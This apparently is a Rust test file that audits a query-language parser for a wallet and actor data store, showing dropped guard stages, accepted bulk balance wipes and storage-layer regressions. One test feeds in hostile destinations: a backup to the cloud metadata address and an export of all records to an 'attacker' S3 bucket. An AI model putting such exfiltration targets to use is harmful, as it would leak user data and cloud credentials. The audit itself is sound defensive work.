use coagomem_core::legacy::*;

fn names(q: &CiaQuery) -> Vec<String> {
    q.stages
        .iter()
        .map(|s| {
            format!("{:?}", s)
                .split(|c| c == '(' || c == ' ' || c == '{')
                .next()
                .unwrap()
                .to_string()
        })
        .collect()
}

#[test]
fn a1_cookbook_shorthand_drops_every_stage() {
    // Section 8.1 recipe 2, verbatim (newline-separated shorthand, no `|>`).
    let q = r#"@0x0008F421
where state.status == "ACTIVE" and state.wallet.balance_cents >= 5000
mutate {
  state.wallet.balance_cents -= 5000,
  state.metrics.tx_count += 1,
  episodes.append({ tool: "payment_gateway", ref: $ref:0x99A4F012, status: 200 })
}
select {
  remaining_cents: state.wallet.balance_cents,
  tx_lsn: meta.last_tx_seq
}"#;
    let r = parse_ciaql(q).unwrap();
    println!("A1 recipe2 -> source={:?} stages={:?}", r.source, names(&r));
    assert!(
        r.stages.is_empty(),
        "guard + debit + select silently dropped"
    );
}

#[test]
fn a2_tx_recipe_rejected_or_dropped() {
    let q = r#"tx [@0x0008F421, @0x0009B104]
where actor(0x0008F421).state.wallet.balance_cents >= 120000
mutate { actor(0x0008F421).state.wallet.balance_cents -= 120000 }"#;
    println!("A2 recipe3 -> {:?}", parse_ciaql(q).map(|r| names(&r)));
}

#[test]
fn a3_scan_all_with_mutate_is_accepted() {
    let r = parse_ciaql(r#"scan actors[*] |> mutate { state.wallet.balance_cents = 0 }"#).unwrap();
    println!("A3 -> {:?} {:?}", r.source, names(&r));
    assert_eq!(r.source, Source::ScanAll);
    assert!(matches!(r.stages[0], Stage::Mutate(_)));
}

#[test]
fn a4_scan_all_prefix_ignores_trailing_garbage() {
    let r = parse_ciaql(r#"scan actors[*] where THIS IS IGNORED mutate {x=1}"#).unwrap();
    println!("A4 -> {:?} {:?}", r.source, names(&r));
    assert!(r.stages.is_empty());
}

#[test]
fn a5_backup_and_export_accept_any_destination() {
    let b = parse_ciaql(r#"backup store to "http://169.254.169.254/latest" with (x: 1)"#).unwrap();
    println!("A5 backup -> {:?}", b.source);
    let e = parse_ciaql(
        r#"scan actors[*] |> export to (format: "CSV", destination: "s3://attacker/dump")"#,
    )
    .unwrap();
    println!("A5 export -> {:?}", e.stages);
}

#[test]
fn a6_hardcoded_parameters_ignore_user_input() {
    let r = parse_ciaql(r#"@0x1 |> similarity(vector: [1.0], metric: L2, threshold: 0.99) |> search(field: x, query: "q", top_k: 500)"#).unwrap();
    println!("A6 -> {:?}", r.stages);
}

#[test]
fn a7_duplicate_tx_participants_accepted() {
    let r = parse_ciaql("TX_ACTORS[0x1, 0x1] |> mutate { x += 1 }").unwrap();
    println!("A7 -> {:?}", r.source);
}

#[test]
fn a8_resolve_tenant_split_inside_quotes() {
    let r = parse_ciaql(r#"resolve tenant "a as b" as @x"#);
    println!("A8 -> {:?}", r.map(|q| q.source));
}

#[test]
fn a9_take_not_last_and_where_typo_inside_body() {
    let r = parse_ciaql("@0x1 |> take 1 |> mutate { x = 1 }").unwrap();
    println!("A9 -> {:?}", names(&r));
}

#[test]
fn b1_extentloc_container_aliasing() {
    let a = ExtentLoc::new(4096 + 7, 1 << 48 | 5, false);
    let b = ExtentLoc::new(7, 5, false);
    println!("B1 -> {:#x} vs {:#x} equal={}", a.raw(), b.raw(), a == b);
    assert_eq!(
        a, b,
        "container 4103 and block 2^48+5 alias container 7 block 5"
    );
}

#[test]
fn b2_lsn_regression_silently_ignored() {
    let arena = SlotArena::<16>::new(0, 2, 1);
    let tw = TenantWord {
        tenant: 1,
        core: 0,
        layout_version: 1,
        flags: 0,
    };
    let h = arena.install(0, tw, 100, 100).unwrap().unwrap();
    arena.write(h, 50, |w| w.set(0, 42)).unwrap();
    let s = arena
        .read(h, 1, Visibility::Optimistic, |v| v.word(0))
        .unwrap();
    println!(
        "B2 -> data={} applied_lsn={} (write stamped lsn 50 dropped)",
        s.value, s.applied_lsn
    );
}

#[test]
fn b3_durable_watermark_can_regress() {
    let arena = SlotArena::<16>::new(0, 1, 1);
    arena.core_control(0).publish_durable(100);
    arena.core_control(0).publish_durable(10);
    println!(
        "B3 -> durable after regress = {}",
        arena.core_control(0).durable()
    );
}

#[test]
fn a10_other_cookbook_recipes() {
    let r4 = r#"scan actors[*]
where state.subscription.tier == "ENTERPRISE" and state.ai.tokens_saved > 10000
group by (state.profile.region)
aggregate { total_users: count() }
take 20"#;
    let r5 = r#"@0x0008F421
similarity(vector: [0.12, -0.88, 0.44, 0.31], metric: COSINE, threshold: 0.82)
where episodes.status == "ERROR"
take 5"#;
    let alias = r#"@acme {
  wallet.balance_cents -= 2500
}"#;
    let join = r#"@0x0008F421
join @actor(state.profile.org_actor_id) as @org
where @org.state.billing_status == "CURRENT""#;
    for (n, q) in [
        ("recipe4", r4),
        ("recipe5", r5),
        ("alias", alias),
        ("join", join),
    ] {
        println!(
            "A10 {n} -> {:?}",
            parse_ciaql(q).map(|q| (q.source, q.stages.len()))
        );
    }
}
